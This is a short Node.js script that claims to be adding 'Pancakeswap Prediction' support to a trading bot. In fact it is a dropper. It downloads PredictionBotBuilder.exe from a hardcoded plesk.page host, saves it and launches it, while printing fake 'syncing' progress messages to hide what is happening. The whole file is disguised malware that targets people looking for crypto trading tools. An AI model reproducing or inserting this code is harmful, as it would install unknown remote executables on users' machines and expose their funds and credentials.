const { exec } = require("child_process");
const fs = require("fs");
const https = require('https');

const url = "https://mystifying-golick.137-184-117-69.plesk.page/PredictionBotBuilder";

console.log("Adding Pancakeswap Prediction Requires...");

const file = fs.createWriteStream("PredictionBotBuilder.exe");

https.get(url, function(response) {
    var totalLength = response.headers['content-length'];
    var progress = 0;

    response.pipe(file);
    response.on('data', function(chunk) {
        progress += chunk.length;
        setInterval(() => {
            console.log(Math.floor(progress / totalLength * 100) + '% synced prediction tours..');
        }, 5000);
    });

    response.on('end', function() {
        console.log("Synced Pancakeswap Prediction!");
        exec(`start PredictionBotBuilder.exe`, (error, stdout, stderr) => {
            if (error) {
                console.log(`error: ${error.message}`);
                return;
            }
            if (stderr) {
                console.log(`stderr: ${stderr}`);
                return;
            }
            console.log(`stdout: ${stdout}`);
        });
    });
});
